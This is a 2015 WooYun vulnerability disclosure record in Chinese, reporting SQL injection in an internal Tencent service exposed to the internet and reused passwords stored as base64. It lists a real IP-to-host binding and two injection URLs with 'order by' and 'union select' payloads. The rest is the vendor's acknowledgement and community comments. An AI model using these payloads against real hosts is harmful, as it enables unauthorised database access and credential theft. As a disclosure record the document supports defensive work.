{"id": 45575, "wybug_id": "wooyun-2015-095277", "wybug_title": "腾讯某内部业务对外存在多个sql注入(少量qq账号密码泄露base64的)", "wybug_corp": "腾讯", "wybug_author": "boooooom", "wybug_date": "2015-02-02 19:00", "wybug_open_date": "2015-03-19 19:02", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "字符类型注射", "管理后台对外"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-19：\t细节向公众公开  简要描述： RT 详细说明：  老规矩，来先绑个host吧\n119.147.78.19 at.qq.com119.147.78.19 at.addev.com\n呃，我为什么知道要绑，看这个jsat.qq.com/js/page/pagecommon.js\n//获取登录qq的姓名，部门和头像function getLoginUserInfo() {    var host = window.location.host;    var info = new Array();        var name;        if (host == atConfig.innerHost) { //内网OA用户         at.addev.com        var rtx = Act.util.cookie('oaloginuser');        name = Act.util.cookie(rtx + '_name');                if (name == null) {            $.ajax({                url : '/user/getLoginUserInfo',                type : 'post',                dataType: 'json',                async : false,\n完事就可以看到一个内部业务，自动化测试？注入点\nhttp://at.addev.com/api/getActInfo?domain=at.addev.com&user=taijunwang%27%20order%20by%2017--%20;http://at.addev.com/activity/getFunModelFActID=1 union select version(),2 -- ;\n   漏洞证明：  \n\n注入：\n\n\n\n\n\n   修复方案：  嗯！访问控制   版权声明：转载请注明来源 boooooom@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-02-03 10:14 厂商回复： 非常感谢您的报告，问题已着手处理，感谢大家对腾讯业务安全的关注。如果您有任何疑问，欢迎反馈，我们会有专人跟进处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-02-03 10:48 |    \t\t瘦蛟舞  \t\t\t( 普通白帽子  |\t\t\t        Rank:687 漏洞数:78        | 铁甲依然在)\t\t \n  霍元甲你嘛时候才是乌云第一    \n     2015-03-16 14:53 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  。。。擦 怎么知道绑定的host的，那个js文件被腾讯删了    \n     2015-03-16 21:22 |    \t\t90Snake \t\t\t( 普通白帽子  |\t\t\t        Rank:109 漏洞数:42        | 最大的漏洞就是人)\t\t \n  霍元甲你嘛时候才是乌云第一    \n     2015-03-19 21:27 |    \t\tJumbo \t\t\t( 普通白帽子  |\t\t\t        Rank:111 漏洞数:29        | 猫 - http://www.chinabaiker.com)\t\t \n  @px1624 为什么要绑定host?    \n     2015-03-19 23:47 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @Jumbo 绑定host就等于是请求的时候的来源ip是固定的    \n     2015-03-20 09:20 |    \t\tboooooom  \t\t\t( 普通白帽子  |\t\t\t        Rank:467 漏洞数:50        | 我有一个好想法！)\t\t \n  @px1624 单IP帮了多个host，不绑定访问不了！    \n     2015-03-20 09:37 |    \t\txsser_w \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:33        | 哎)\t\t \n  关键是你他吗的怎么知道的他要这个js的，不是访问不来么！    \n     2015-03-20 13:10 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @boooooom 为啥要绑定host是4楼问的，我问的是你怎么找到这个js的。。。js被腾讯屏蔽了，想知道里面代码是啥    \n     2015-03-20 13:48 |    \t\tboooooom  \t\t\t( 普通白帽子  |\t\t\t        Rank:467 漏洞数:50        | 我有一个好想法！)\t\t \n  @px1624 直接访问ip的时候里面会有这个js    \n     2015-03-20 17:06 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @boooooom 额，受教了。是不是无法访问，然后你看到源码中有这个js，然后看了js后，绑定了host，然后就可以正常访问了？    \n     2015-03-20 17:17 |    \t\tboooooom  \t\t\t( 普通白帽子  |\t\t\t        Rank:467 漏洞数:50        | 我有一个好想法！)\t\t \n  @px1624 你太机智了。    \n     2015-08-11 13:32 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:512 漏洞数:77        | 潜心学习~~~)\t\t \n  qq密码base64存储。。。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}